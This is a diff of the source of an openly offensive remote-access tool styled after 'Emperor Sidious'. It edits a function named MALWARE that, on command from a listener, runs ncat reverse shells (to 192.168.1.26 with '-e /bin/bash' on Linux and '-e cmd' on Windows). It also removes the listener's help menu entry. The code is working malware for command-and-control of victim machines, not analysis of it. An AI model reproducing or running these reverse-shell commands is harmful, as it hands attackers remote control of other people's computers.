@@ -60,7 +60,6 @@ EMPEROR_MENU_BANNER = ("""
 
 LISTENER_MENU_BANNER = ("""
  \033[97;1m╔═══[COMMAND]══════[DESCRIPTION]══════════════════════════════════════════════════════╗\033[0m
- \033[97;1m║>>>\033[0m \033[91mhelp\033[0m           \033[97;1mDisplay all [listener] tool commands                              ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mzombie -l\033[0m      \033[97;1mStart zombie mode on the target machine Linux                     ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mzombie -w\033[0m      \033[97;1mStart zombie mode on the target machine Windows                   ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mipinfo\033[0m         \033[97;1mObtain all the IP address information of the target machine       ║\033[0m
@@ -107,7 +106,7 @@ def MALWARE():
         MALWARE_RECV = SOCKET.recv(8000).decode()
         
         if MALWARE_RECV == "zombie -l":
-           os.system("ncat 192.168.1.26 834 -e sh")
+           os.system("ncat 192.168.1.26 834 -e /bin/bash")
            
         if MALWARE_RECV == "zombie -w":
            os.system("ncat 192.168.1.26 835 -e cmd")
@@ -164,7 +163,7 @@ def LISTENER():
     TEXT_DELAY(EMPEROR_LOGO_BANNER, 0.0005)
     TEXT_DELAY(LISTENER_MENU_BANNER, 0.0005)
  
-    LHOST = input(" \033[97;1m╔═[\033[0m\033[91mСидиус\033[0m\033[97;1m]═[\033[91mLHORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")
+    LHOST = input(" \033[97;1m╔═[\033[0m\033[91mСидиус\033[0m\033[97;1m]═[\033[91mLHORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")  
     LPORT = input(" \033[97;1m╔═[\033[0m\033[91mСидиус\033[0m\033[97;1m]═[\033[91mLPORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")
 
     SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -182,13 +181,6 @@ def LISTENER():
         print(" \033[97;1m╔═[\033[0m\033[91mИмператор Сидий\033[0m\033[97;1m]═[\033[91mlistener\033[0m\033[97;1m]")
         print(" \033[97;1m╚═════════>>>\033[0m", end=" ") 
         LISTENER_INPUT = input()
-        
-        if LISTENER_INPUT == "help":
-           print(" \033[97;1m[\033[38;5;208m...\033[0m] Watching all [listener] tool commands...\033[0m")
-           time.sleep(2)
-           TEXT_DELAY(LISTENER_MENU_BANNER, 0.0005)
-           time.sleep(10)
-           LISTENER() 
            
         if LISTENER_INPUT == "zombie -l":
            print(" \033[97;1m[\033[38;5;208m...\033[0m] Starting zombie mode on the target machine Linux...\033[0m")
